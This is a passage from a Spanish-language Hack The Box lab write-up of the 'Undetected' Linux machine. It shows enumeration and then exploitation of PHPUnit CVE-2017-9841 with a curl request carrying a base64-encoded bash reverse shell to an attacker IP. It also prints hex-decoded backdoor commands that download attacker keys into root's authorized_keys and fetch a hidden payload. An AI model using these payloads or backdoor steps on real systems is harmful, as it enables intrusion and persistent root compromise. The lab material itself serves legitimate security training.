<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox Writeup Undetected" /><meta property="og:locale" content="en" /><meta name="description" content="Máquina Linux donde enumeramos por TCP para hallar un subdominio que al aplicar Directory Fuzzing encontramos una ruta vulnerable del framework PHPUnit que nos permitía Remote Code Execution (RCE) y obtener una shell (CVE-2017-9841). Luego encontramos en los backups del usuario actual un binario, que al leer strings imprimibles y desencriptar la data, mostraba la creación de un nuevo usuario y su contraseña encriptada. Entonces aplicamos Brute Force con john, y nos logeamos con ese usuario por SSH. Para la escalada encontramos un correo del usuario root hacia nosotros que nos comentaba sobre comportamientos raros del servidor Apache. Para ello, hicimos un script en bash para buscar archivos modificados del servidor, encontramos otro binario e igualmente al leer strings imprimibles y desencriptarlo, mostraba una modificación sospechosa del binario Secure Shell Daemon (SSHD). Nos traemos el binario a nuestra máquina y debido al tamaño aplicamos Reverse Engineering con ghidra. Filtramos con palabras que nos pueden interesar como ‘password/authentication’ y encontramos una función que almacena un Backdoor encriptado. Logramos crear un script en python para desencriptarla, logearnos como root y obtener una shell." /><meta property="og:description" content="Máquina Linux donde enumeramos por TCP para hallar un subdominio que al aplicar Directory Fuzzing encontramos una ruta vulnerable del framework PHPUnit que nos permitía Remote Code Execution (RCE) y obtener una shell (CVE-2017-9841). Luego encontramos en los backups del usuario actual un binario, que al leer strings imprimibles y desencriptar la data, mostraba la creación de un nuevo usuario y su contraseña encriptada. Entonces aplicamos Brute Force con john, y nos logeamos con ese usuario por SSH. Para la escalada encontramos un correo del usuario root hacia nosotros que nos comentaba sobre comportamientos raros del servidor Apache. Para ello, hicimos un script en bash para buscar archivos modificados del servidor, encontramos otro binario e igualmente al leer strings imprimibles y desencriptarlo, mostraba una modificación sospechosa del binario Secure Shell Daemon (SSHD). Nos traemos el binario a nuestra máquina y debido al tamaño aplicamos Reverse Engineering con ghidra. Filtramos con palabras que nos pueden interesar como ‘password/authentication’ y encontramos una función que almacena un Backdoor encriptado. Logramos crear un script en python para desencriptarla, logearnos como root y obtener una shell." /><link rel="canonical" href="https://e1p0tr0.github.io/posts/HTBUndetected/" /><meta property="og:url" content="https://e1p0tr0.github.io/posts/HTBUndetected/" /><meta property="og:site_name" content="Marss" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-23T04:07:39-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Writeup Undetected" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-04-23T04:07:39-05:00","datePublished":"2022-04-23T04:07:39-05:00","description":"Máquina Linux donde enumeramos por TCP para hallar un subdominio que al aplicar Directory Fuzzing encontramos una ruta vulnerable del framework PHPUnit que nos permitía Remote Code Execution (RCE) y obtener una shell (CVE-2017-9841). Luego encontramos en los backups del usuario actual un binario, que al leer strings imprimibles y desencriptar la data, mostraba la creación de un nuevo usuario y su contraseña encriptada. Entonces aplicamos Brute Force con john, y nos logeamos con ese usuario por SSH. Para la escalada encontramos un correo del usuario root hacia nosotros que nos comentaba sobre comportamientos raros del servidor Apache. Para ello, hicimos un script en bash para buscar archivos modificados del servidor, encontramos otro binario e igualmente al leer strings imprimibles y desencriptarlo, mostraba una modificación sospechosa del binario Secure Shell Daemon (SSHD). Nos traemos el binario a nuestra máquina y debido al tamaño aplicamos Reverse Engineering con ghidra. Filtramos con palabras que nos pueden interesar como ‘password/authentication’ y encontramos una función que almacena un Backdoor encriptado. Logramos crear un script en python para desencriptarla, logearnos como root y obtener una shell.","headline":"Hackthebox Writeup Undetected","mainEntityOfPage":{"@type":"WebPage","@id":"https://e1p0tr0.github.io/posts/HTBUndetected/"},"url":"https://e1p0tr0.github.io/posts/HTBUndetected/"}</script><title>Hackthebox Writeup Undetected | Marss</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Marss"><meta name="application-name" content="Marss"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Marss</a></div><div class="site-subtitle font-italic">Freelance Professional [eJPTv2]</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/E1P0TR0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['marsello.guillen','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox Writeup Undetected</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Writeup Undetected</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Marsello Guillén</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1650704859" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-04-23 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3325 words"> <em>18 min</em> read</span></div></div></div><div class="post-content"><p>Máquina <strong>Linux</strong> donde enumeramos por <strong>TCP</strong> para hallar un subdominio que al aplicar <strong>Directory Fuzzing</strong> encontramos una ruta vulnerable del framework <strong>PHPUnit</strong> que nos permitía <strong>Remote Code Execution (RCE)</strong> y obtener una shell <strong>(CVE-2017-9841)</strong>. Luego encontramos en los <strong>backups</strong> del usuario actual un binario, que al leer strings imprimibles y desencriptar la data, mostraba la creación de un nuevo usuario y su contraseña encriptada. Entonces aplicamos <strong>Brute Force</strong> con <strong>john</strong>, y nos logeamos con ese usuario por <strong>SSH</strong>. Para la escalada encontramos un correo del usuario <strong>root</strong> hacia nosotros que nos comentaba sobre comportamientos raros del servidor <strong>Apache</strong>. Para ello, hicimos un script en <strong>bash</strong> para buscar archivos modificados del servidor, encontramos otro binario e igualmente al leer strings imprimibles y desencriptarlo, mostraba una modificación sospechosa del binario <strong>Secure Shell Daemon (SSHD)</strong>. Nos traemos el binario a nuestra máquina y debido al tamaño aplicamos <strong>Reverse Engineering</strong> con <strong>ghidra</strong>. Filtramos con palabras que nos pueden interesar como ‘password/authentication’ y encontramos una función que almacena un <strong>Backdoor</strong> encriptado. Logramos crear un script en <strong>python</strong> para desencriptarla, logearnos como <strong>root</strong> y obtener una shell.</p><hr /><p><img data-src="/assets/img/htb/writeups/undetected/logo.png" alt="UndetectedLogo" class="shadow" data-proofer-ignore></p><div class="table-wrapper"><table><thead><tr><th style="text-align: center">OS<th style="text-align: center">IP<th style="text-align: center">Release Date<th style="text-align: center">Difficulty<th style="text-align: center">Points<tbody><tr><td style="text-align: center">Linux<td style="text-align: center">10.10.11.146<td style="text-align: center">19 Feb 2022<td style="text-align: center">Medium<td style="text-align: center">30</table></div><hr /><p>Antes de iniciar no olvidemos verficar que estamos conectados a la <strong>VPN</strong> de HTB y tenemos conexión a la máquina:</p><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>❯ ping <span class="nt">-c1</span> 10.10.11.146
PING 10.10.11.146 <span class="o">(</span>10.10.11.146<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.11.146: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>119 ms
					  <span class="se">\_</span>_____________________ Linux Machine
<span class="nt">---</span> 10.10.11.146 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
	  <span class="se">\_</span>________________<span class="se">\_</span>___________________________________ Successful connection
rtt min/avg/max/mdev <span class="o">=</span> 118.675/118.675/118.675/0.000 ms
</pre></table></code></div></div><blockquote><p>Explicación de parámetros:</p><p>-c &lt;count&gt; : Número de paquetes ICMP que deseamos enviar a la máquina</p></blockquote><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Con <code class="language-plaintext highlighter-rouge">nmap</code> realizamos un escaneo de tipo <strong>TCP (Transfer Control Protocol)</strong> para descubrir puertos abiertos:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p- --open -sS --min-rate 5000 -v -n 10.10.11.146
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-28 02:50 -05
Initiating Ping Scan at 02:50
Scanning 10.10.11.146 [4 ports]
Completed Ping Scan at 02:50, 0.17s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 02:50
Scanning 10.10.11.146 [65535 ports]
Discovered open port 22/tcp on 10.10.11.146
Discovered open port 80/tcp on 10.10.11.146
Completed SYN Stealth Scan at 02:50, 19.95s elapsed (65535 total ports)
Nmap scan report for 10.10.11.146
Host is up (0.33s latency).
Not shown: 54572 closed tcp ports (reset), 10961 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh      
	      \_________ Secure Shell Protocol
80/tcp open  http     
	      \_________ HyperText Transfer Protocol
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p- : Escanear todos los puertos, del 1 al 65,535</p><p>--open : Escanear solo puertos abiertos</p><p>-sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo</p><p>--min-rate &lt;number&gt; : Enviar una taza (&lt;number&gt;) de paquetes por segundo como mínimo</p><p>-v : Imprimir información del proceso del escaneo</p><p>-n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)</p></blockquote><p>Ahora escaneamos de manera específica los puertos <strong>22 (SSH) - 80 (HTTP)</strong> en cuestión:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p 22,80 -sCV -oN targetTCP 10.10.11.146
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-28 12:24 -05
Nmap scan report for djewelry.htb (10.10.11.146)
Host is up (0.39s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
| ssh-hostkey: 
|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)
|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)
|_  256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Diana's Jewelry
|_http-server-header: Apache/2.4.41 (Ubuntu)
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p &lt;port_1,port_2,...&gt; : Indicamos que puertos queremos escanear</p><p>-sC : Ejecutar en los puertos scripts por defecto de nmap</p><p>-sV : Activar detección de versiones de los servicios que corren por los puertos</p><p>-oN &lt;file&gt; : Guardar el output del escaneo en un archivo con formato Nmap</p></blockquote><p>Ya que no disponemos de credenciales para entrar por <strong>SSH</strong>, empezamos con el servicio web que corre por el puerto <strong>80 (HTTP)</strong>:</p><blockquote><p>Con <code class="language-plaintext highlighter-rouge">whatweb</code> podemos ver tecnologías que usa el sitio</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">❯ whatweb http://10.10.11.146
http//10.10.11.146 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.146], JQuery[2.1.4], Script, Title[Diana's Jewelry]
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Si quieres una opción gráfica puedes usar en tu navegador la extensión <a href="https://www.wappalyzer.com/apps/">Wappalyzer</a> y ver las tecnologías</p></div></blockquote><blockquote><p>Con <code class="language-plaintext highlighter-rouge">Firefox</code> podemos ver el sitio web</p></blockquote><p><img data-src="/assets/img/htb/writeups/undetected/http_ip.png" alt="HTTP/IP" class="shadow" data-proofer-ignore></p><p>De cara vemos el dominio <code class="language-plaintext highlighter-rouge">djewelry.htb</code>, pero no llega a aplicarse <strong>Virtual hosting</strong></p><p>Toqueteando el landing page encontramos el subdominio <code class="language-plaintext highlighter-rouge">store.djewelry.htb</code>, lo agregamos a nuestro archivo <em>/etc/hosts</em>: <code class="language-plaintext highlighter-rouge">echo "10.10.11.146 store.djwelry.htb" &gt;&gt; /etc/hosts</code> y aquí si se aplica <strong>Virtual hosting</strong>:</p><p><img data-src="/assets/img/htb/writeups/undetected/http_store_djwelry.png" alt="HTTP/SUBDOAMIN" class="shadow" data-proofer-ignore></p><blockquote><p>Tambien podemos encontrar el subdominio usando <code class="language-plaintext highlighter-rouge">curl</code></p></blockquote><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://10.10.11.146"</span> | <span class="nb">grep</span> <span class="nt">-oE</span> <span class="s2">"http.*htb"</span> | <span class="nb">sort</span> <span class="nt">-u</span>
http://store.djewelry.htb
</pre></table></code></div></div><p>Observamos la página pero no encontramos algo interesante así que aplicamos <strong>Directory Fuzzing</strong> con <code class="language-plaintext highlighter-rouge">gobuster</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="go">❯ gobuster dir -t 60 -u "http://store.djewelry.htb/" -b 400,404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://store.djewelry.htb/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   400,404
[+] User Agent:              gobuster/3.1.0
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
2022/04/28 19:00:43 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 200) [Size: 12563]
/css                  (Status: 200) [Size: 2175] 
/js                   (Status: 200) [Size: 2791] 
/vendor               (Status: 200) [Size: 3126] 
/fonts                (Status: 200) [Size: 7580]
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>dir : Usar modo de enumeración de directorios/archivos</p><p>-t &lt;count&gt; : Asignar &lt;count&gt; tareas en paraleo</p><p>-u &lt;url&gt; : Url objetivo</p><p>-b &lt;status_code&gt; : Omitir output de ciertos &lt;status_code&gt;</p><p>-w &lt;wordlist&gt; : Ruta de &lt;wordlist&gt; para el fuzzing</p></blockquote><p>Todas la rutas son clásicas de un sitio web menos <code class="language-plaintext highlighter-rouge">vendor</code>, el cuál tiene activo <strong>Directory Listing</strong>:</p><p><img data-src="/assets/img/htb/writeups/undetected/http_vendor_path.png" alt="HTTP/VENDOR" class="shadow" data-proofer-ignore></p><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Investigando un poco encontramos una vulnerabilidad que nos permite <strong>Remote Code Execution</strong> por medio del framework <strong>PHPUnit <a href="https://blog.ovhcloud.com/cve-2017-9841-what-is-it-and-how-do-we-protect-our-customers/">(CVE-2017-9841)</a></strong></p><p>La vulnerabilidad se da gracias a la linea de código <code class="language-plaintext highlighter-rouge">eval('?&gt;' . file_get_contents('php://input'));</code> del archivo <code class="language-plaintext highlighter-rouge">eval-stdin.php</code> de reside en la ruta <code class="language-plaintext highlighter-rouge">http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></p><p>Ahora solo nos queda inyectar una <strong>Reverse shell</strong> y conseguimos entrar a la máquina como el usuario <strong>www-data</strong>:</p><p>Podemos hacerlo usando <code class="language-plaintext highlighter-rouge">burpsuite</code> o <code class="language-plaintext highlighter-rouge">curl</code> :</p><blockquote><p><strong>Burpsuite</strong></p><p><img data-src="/assets/img/htb/writeups/undetected/burpsuite_rce.png" alt="BURPSUITE/RCE" data-proofer-ignore></p></blockquote><blockquote class="nolineno"><p><strong>Curl</strong></p><p>Para evitar problemas con las comillas dobles y simples <code class="language-plaintext highlighter-rouge">"",''</code>, codificamos nuestra reverse shell a <code class="language-plaintext highlighter-rouge">base64</code> y ya en la petición lo decodeamos con <code class="language-plaintext highlighter-rouge">base64_decode</code> para ejecutarlo:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="nt">-XPOST</span> <span class="nt">-d</span> <span class="s1">'&lt;?php system(base64_decode(L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE2LzEyMzQgMD4mMScK));'</span> http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
</pre></table></code></div></div></blockquote><blockquote class="prompt-tip"><div><p>La vulnerabilidad funciona con cualquiera de los <strong>HTTP methods</strong></p></div></blockquote><p>En ambos casos solo queda ponerse en escucha con <code class="language-plaintext highlighter-rouge">nc</code> por el puerto especificado, ejecutar lo anterior, recibir la shell y pa-dentro:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="go">❯ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.146] 38938
bash: cannot set terminal process group (866): Inappropriate ioctl for device
bash: no job control in this shell
</span><span class="gp">www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$</span><span class="w"> 
</span></pre></table></code></div></div><blockquote><p>En resumen, el código PHP obtiene un archivo <strong><em>file_get_contents()</em></strong> a través del flujo de entrada <strong><em>php://input</em></strong>, luego lo convierte en cadena y lo ejecuta <strong><em>eval()</em></strong></p></blockquote><blockquote class="prompt-info"><div><p>Para información mas detallada puede visitar el siguiente articulo: <a href="https://www.imperva.com/blog/the-resurrection-of-phpunit-rce-vulnerability/">https://www.imperva.com/blog/the-resurrection-of-phpunit-rce-vulnerability/</a></p></div></blockquote><p>Enumerando como el usuario <strong>www-data</strong> encontramos en <code class="language-plaintext highlighter-rouge">/var/backups</code> un binario interesante llamado <code class="language-plaintext highlighter-rouge">info</code> que solo nuestro usuario puede leer y ejecutar</p><p>Como es un binario intentamos leer las cadenas imprimibles que podemos visualizar con <code class="language-plaintext highlighter-rouge">strings</code>. Por ello, pasamos el archivo a nuestra máquina y visualizamos lo siguiente:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="go">❯ strings info
</span><span class="c">........
.....
..........
</span><span class="go">776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65
732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f
7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b737973
74656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e5674
47673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f
7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f20222431
22202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d6520736865
6c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e6520
3c2075736572732e7478743b20726d2075736572732e7478743b
</span><span class="c">.......
.....
...........
</span></pre></table></code></div></div><p>Podemos reconocer que el formato es <strong>Hexadecimal</strong> así que lo decodeamos y encontramos una serie de comandos:</p><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>❯ <span class="nb">cat </span>hiddenHexData.txt | xxd <span class="nt">-r</span> <span class="nt">-p</span> | <span class="nb">tr</span> <span class="s1">';'</span> <span class="s1">'\n'</span> | <span class="nb">sed</span> <span class="s1">'s/^ //g'</span>
wget tempfiles.xyz/authorized_keys <span class="nt">-O</span> /root/.ssh/authorized_keys
wget tempfiles.xyz/.main <span class="nt">-O</span> /var/lib/.main
<span class="nb">chmod </span>755 /var/lib/.main
